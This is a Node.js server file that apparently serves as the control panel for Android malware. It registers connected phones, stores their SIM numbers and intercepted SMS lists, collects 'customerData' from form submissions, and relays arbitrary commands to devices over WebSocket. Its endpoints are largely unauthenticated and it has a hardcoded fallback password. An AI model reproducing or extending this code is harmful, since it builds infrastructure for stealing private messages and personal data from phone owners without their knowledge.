require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

let MONGO_URI = process.env.MONGO_URI || '';
if (MONGO_URI) { MONGO_URI = MONGO_URI.replace(/\\"/g, '').replace(/;/g, '').trim(); }

let dbConnected = false;
if (!MONGO_URI) { console.error('CRITICAL: MONGO_URI missing'); } 
else {
    mongoose.set('bufferCommands', false);
    mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 5000, connectTimeoutMS: 10000, writeConcern: { w: 1 } })
    .then(() => { dbConnected = true; console.log('✅ MongoDB connected'); })
    .catch(err => { console.error('❌ MongoDB error:', err.message); });
}

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: { type: Number, default: 0 },
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: { type: Boolean, default: false },
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: { type: Boolean, default: false },
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.post('/api/change-password', (req, res) => {
    const { oldPassword, newPassword } = req.body || {};
    if (oldPassword === adminPassword) { adminPassword = newPassword; return res.json({ success: true }); }
    return res.status(401).json({ success: false, message: 'Wrong old password' });
});

app.get('/api/devices', async (req, res) => {
  try {
    if (!dbConnected) return res.json([]);
    const list = await Device.find({ isDeleted: { $ne: true } }).lean();
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
    await Device.deleteMany(query);
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { return res.status(500).json({ success: false }); }
});

app.post('/api/delete-sms', async (req, res) => {
    try {
        const { deviceId, smsData } = req.body || {};
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        await Device.findOneAndUpdate(
            query,
            { $pull: { smsMessages: { body: smsData.body, date: smsData.date } } }
        );
        return res.json({ success: true });
    } catch(e) { return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
    try {
        const { deviceId, status } = req.body || {};
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        await Device.findOneAndUpdate(
            query,
            { $set: { isPinned: !!status } }
        );
        io.emit('dashboard-update');
        return res.json({ success: true });
    } catch(e) { return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
    try {
        const { deviceId, action, data } = req.body || {};
        const query = mongoose.Types.ObjectId.isValid(deviceId) ? { _id: deviceId } : { deviceId };
        let device = await Device.findOne(query).lean();
        if (!device) return res.status(404).json({ success: false });
        
        const clients = global.deviceSockets.get(device.deviceId);
        if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
            return res.json({ success: true, device, messages: device.smsMessages, customerData: device.customerData });
        }
        if (!clients || clients.size === 0) return res.json({ success: false, message: 'Offline' });
        clients.forEach(c => { if(c.readyState === WebSocket.OPEN) c.send(JSON.stringify({ command: action, data })); });
        return res.json({ success: true });
    } catch(e) { return res.status(500).json({ success: false }); }
});

server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return;
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);
      const id = data.deviceId || data.serialNumber;
      if (!id) return;
      ws.deviceId = id;
      if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
      global.deviceSockets.get(id).add(ws);
      
      let b = parseInt(data.battery);
      const update = { 
          $set: { 
              deviceId: id, isOnline: true, lastSeen: new Date(),
              model: data.model, androidVersion: data.androidVersion,
              sim1: data.sim1, sim2: data.sim2, battery: isNaN(b) ? 0 : b,
              serialNumber: data.serialNumber || id, isDeleted: false
          } 
      };
      if (data.type === 'SMS_LIST') update.$set.smsMessages = data.messages;
      if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;
      
      if (dbConnected) {
          await Device.findOneAndUpdate({ deviceId: id }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
          io.emit('dashboard-update');
      }
    } catch (e) { }
  });
  ws.on('close', () => { if (ws.deviceId) global.deviceSockets.get(ws.deviceId)?.delete(ws); });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('🚀 Server started'));
